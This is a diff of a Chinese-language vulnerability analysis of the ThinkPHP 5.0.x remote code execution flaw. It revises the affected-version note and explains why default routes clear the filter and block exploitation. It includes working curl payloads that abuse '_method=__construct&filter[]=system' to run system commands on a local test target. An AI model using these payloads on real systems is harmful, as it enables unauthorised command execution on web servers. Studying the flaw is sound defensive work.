@@ -21,7 +21,7 @@ curl -d "_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=l
 不需要开启debug版本，但需要是完整版，很容易满足:
  curl -v -d "_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=dir" "http://localhost/loudong/public/index.php?s=captcha&a=dir"
 
-5.0.10比较特殊,既不需要开启debug,也不要求是完整版：
+5.0.13之前比较特殊,既不需要开启debug,也不要求是完整版：
  curl -v -d "_method=__construct&filter[]=system&method=get" "http://localhost/loudong/public/index.php?s=index/index/index&a=dir"
 ```
 
@@ -485,7 +485,9 @@ private static function checkRoute($request, $rules, $url, $depr = '/', $group =
     }
 ```
 
-这里有效的route只有完整版中才有的`captcha`。
+这里有效的route除了一些默认的之外,就有完整版中才有的`captcha`。
+
+默认的route最终会调用moudle函数，其中调用`$request->filter($config['default_filter']);`清空了filter导致漏洞利用失败。
 
 ![](/assets/php/TIM截图20190112215227.png)
 
